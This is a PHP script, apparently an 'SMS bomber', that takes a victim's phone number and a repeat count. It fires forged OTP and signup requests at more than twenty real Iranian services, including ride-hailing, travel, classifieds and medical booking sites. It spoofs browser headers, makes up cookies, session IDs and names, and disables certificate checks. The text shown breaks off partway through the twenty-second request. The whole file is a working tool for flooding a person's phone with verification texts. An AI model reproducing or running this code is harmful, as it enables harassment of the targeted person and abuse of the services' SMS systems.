<?php
//============================================================================//
//Headers Setting
//------------------------
// Channel : @LintoCode
// Developer : @DevMrAmir
//------------------------
header("Content-Type: text/plain");
ini_set('max_execution_time', 0);
set_time_limit(0);
error_reporting(0);
//============================================================================//
//Strings
$Phone = htmlspecialchars($_GET['phone']);
$count = htmlspecialchars($_GET['count']);
$count_final = $count +1;
$full_phone = "0$Phone";
//============================================================================//
//Check Error!
if(empty($Phone)){
echo "'phone' Value Is Empty!!
";
}elseif(empty($count)){
echo "'count' Value Is Empty!!
";
}else{
$Phone_Count = strlen($Phone);
if($Phone_Count == "10"){
$count_Count = strlen($count);
if($count_Count == "1" || $count_Count == "2" && $count <= "20"){
//============================================================================//
//Random Function
function random($length, $type) {
if($type == "1"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "2"){
return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "3"){
return substr(str_shuffle(str_repeat($x='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "4"){
return substr(str_shuffle(str_repeat($x='abcdefghijklmnopqrstuvwxyz', ceil($length/strlen($x)) )),1,$length);
}
if($type == "5"){
return substr(str_shuffle(str_repeat($x='ABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}
if($type == "6"){
return substr(str_shuffle(str_repeat($x='0123456789', ceil($length/strlen($x)) )),1,$length);
}
}
//============================================================================//
//Random Strings
$i = 1;
while($i<$count_final){
$random_ab = random("24", "1");
$PHPSESSID = random("32", "2");
$Sheypoor = random("32", "2");
$fname = random("5", "4");
$lname = random("8", "4");
$password = random("12", "1");
$email_rand = random("7", "2");
$email = "$email_rand@gmail.com";
$AccountOAuthTempID = random("23", "1");
$guid = "".random("8", "3")."-".random("4", "3")."-".random("4", "3")."-".random("4", "3")."-".random("12", "3")."";
//----------------------------------------------------------------------------//
//Sms Sender Curl 1
$Sender = curl_init();
$Sender_Url = "https://tap33.me/api/v2/user";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
'DNT: 1',
'content-type: application/json',
'Accept: */*',
'Origin: https://app.tapsi.cab',
'Sec-Fetch-Site: cross-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://app.tapsi.cab/',
'Accept-Language: fa,en-US;q=0.9,en;q=0.8',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"credential":{"phoneNumber":"'.$full_phone.'","role":"PASSENGER"}}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 2
$Sender = curl_init();
$Sender_Url = "https://ws.alibaba.ir/api/v3/account/mobile/otp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'ab-channel: WEB,PRODUCTION,CSR,WWW.ALIBABA.IR',
'Accept: application/json, text/plain, */*',
'DNT: 1',
'ab-alohomora: '.$random_ab.'',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://www.alibaba.ir',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.alibaba.ir/',
'Accept-Language: fa,en-US;q=0.9,en;q=0.8',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phoneNumber":"'.$full_phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 3
$Sender = curl_init();
$Sender_Url = "https://api-v2.filmnet.ir/access-token/users/$full_phone/otp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'DNT: 1',
'X-Platform: Web',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
'Origin: https://filmnet.ir',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://filmnet.ir/',
'Accept-Language: fa,en-US;q=0.9,en;q=0.8',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 4
$Sender = curl_init();
$Sender_Url = "https://core.gapfilm.ir/mobile/request.asmx/RequestOtpCode";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'DNT: 1',
'AppId: 3',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://www.gapfilm.ir',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.gapfilm.ir/',
'Accept-Language: fa,en-US;q=0.9,en;q=0.8',
'Cache-Control: no-cache',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"request":{"Phone":"'.$Phone.'"}}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 5
$Sender = curl_init();
$Sender_Url = "https://web-api.snapp.ir/api/v1/auth/otp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (ML, like Gecko) Chrome/81.0.4044.113 Safari/536565',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"cellphone":"'.$full_phone.'","g-recaptcha-response":null}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 6
$Sender = curl_init();
$Sender_Url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=$full_phone";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
'DNT: 1',
'Origin: https://snapp.market',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://snapp.market/',
'Accept-Language: fa,en-US;q=0.9,en;q=0.8',
'Accept-Encoding: gzip, deflate',
'Content-Length: 0',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'cellphone='.$full_phone.'');
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 7
$Sender = curl_init();
$Sender_Url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/$full_phone/sms?cCode=+98";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Origin: https://snapp.doctor',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://snapp.doctor/webapp/LoginCustomer',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 8
$Sender = curl_init();
$Sender_Url = "https://api.divar.ir/v5/auth/authenticate";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://divar.ir',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://divar.ir/my-divar/my-posts',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"phone":"'.$Phone.'"}');
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 9
$Sender = curl_init();
$Sender_Url = "https://bama.ir/signin-checkforcellnumber";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/javascript, */*; q=0.01',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://bama.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://bama.ir/Signin?ReturnUrl=%2Fprofile',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'cellNumber='.$full_phone.'');
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 10
$Sender = curl_init();
$Sender_Url = "https://api.torob.com/a/phone/send-pin/?phone_number=$full_phone";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Accept: */*',
'Origin: https://torob.com',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://torob.com/',
'Accept-Language: en-US,en;q=0.9',
'Cookie: abtest=next_pwa;',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 11
$Sender = curl_init();
$Sender_Url = "https://web.emtiyaz.app/json/login";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'Origin: https://web.emtiyaz.app',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://web.emtiyaz.app/settings',
'Accept-Language: en-US,en;q=0.9',
'Cookie: emtiyaz_after_login=%2Foffer%2F299; emtiyaz_cellphone='.$Phone.'; emtiyaz_business_type=0;',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'send=1&cellphone='.$Phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 12
$Sender = curl_init();
$Sender_Url = "https://www.tebinja.com/api/v1/users";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://www.tebinja.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.tebinja.com/app/login',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"username":"'.$full_phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 13
$Sender = curl_init();
$Sender_Url = "https://nobat.ir/nuser/inc/nUserSendCode";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://nobat.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://nobat.ir/',
'Accept-Language: en-US,en;q=0.9',
'Cookie: PHPSESSID='.$PHPSESSID.'; defaultCity=1; defaultCity=1',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'mobile='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 14
$Sender = curl_init();
$Sender_Url = "https://www.sheypoor.com/auth";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://www.sheypoor.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.sheypoor.com/session',
'Accept-Language: en-US,en;q=0.9',
'Cookie: ts='.$Sheypoor.'; _lbsa=false; plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; _gat=1',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'username='.$full_phone.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 15
$Sender = curl_init();
$Sender_Url = "https://www.mihanpezeshk.com/verify_code_patient/$full_phone";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'X-Requested-With: XMLHttpRequest',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.mihanpezeshk.com/confirmcodePatient',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 16
$Sender = curl_init();
$Sender_Url = "https://doctoreto.com/web/api/v2/auth/code";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://doctoreto.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://doctoreto.com/',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate',
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"mobile":"'.$full_phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 17
$Sender = curl_init();
$Sender_Url = "https://base.darmankade.com/v1/PatientLogin";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://www.darmankade.com',
'Sec-Fetch-Site: same-site',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://www.darmankade.com/login',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"Mobile":"'.$full_phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 18
$Sender = curl_init();
$Sender_Url = "https://www.drsaina.com/RegisterLogin?ReturnUrl=%2F";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'Origin: https://www.drsaina.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://www.drsaina.com/RegisterLogin?ReturnUrl=%2F',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber='.$full_phone.'&confirmCode=&fullName=&Password=&Password2=');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 19
$Sender = curl_init();
$Sender_Url = "https://pezeshkekhoob.com/api/register/fast";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'RUN-MODE: DEBUG',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://pezeshkekhoob.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://pezeshkekhoob.com/',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"firstName":"'.$fname.'","lastName":"'.$lname.'","gender":1,"tel":"'.$full_phone.'","termsAndConditions":true}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 20
$Sender = curl_init();
$Sender_Url = "https://account.amootsoft.com/Account/SignUp";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Cache-Control: max-age=0',
'Upgrade-Insecure-Requests: 1',
'Origin: https://account.amootsoft.com',
'Content-Type: application/x-www-form-urlencoded',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-User: ?1',
'Sec-Fetch-Dest: document',
'Referer: https://account.amootsoft.com/Account/SignUp',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, 'AccountOAuthTempID='.$AccountOAuthTempID.'&Mobile='.$full_phone.'&Email=&GenderType=Male&FirstName='.$fname.'&LastName='.$lname.'');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 21
$Sender = curl_init();
$Sender_Url = "https://accounts.inoor.ir/api/v1.0/register/chooseway";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($Sender, CURLOPT_FRESH_CONNECT, true);
curl_setopt($Sender, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Sender, CURLOPT_HTTPHEADER, array(
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
'Content-Type: application/json',
'Origin: https://accounts.inoor.ir',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://accounts.inoor.ir/identity/register',
'Accept-Language: en-US,en;q=0.9',
'Accept-Encoding: gzip, deflate'
));
curl_setopt($Sender, CURLOPT_POST, true);
curl_setopt($Sender, CURLOPT_POSTFIELDS, '{"way":"mobile","identity":"+98-'.$Phone.'"}');
curl_setopt($Sender, CURLOPT_RETURNTRANSFER, true);
$Sender_Response = curl_exec($Sender);
curl_close($Sender);
//----------------------------------------------------------------------------//
//Sms Sender Curl 22
$Sender = curl_init();
$Sender_Url = "https://www.tapdoo.com/user/loginno";
curl_setopt($Sender, CURLOPT_URL, $Sender_Url);
curl_setopt($Sender, CURLOPT_FOLLOWLOCATION, true);
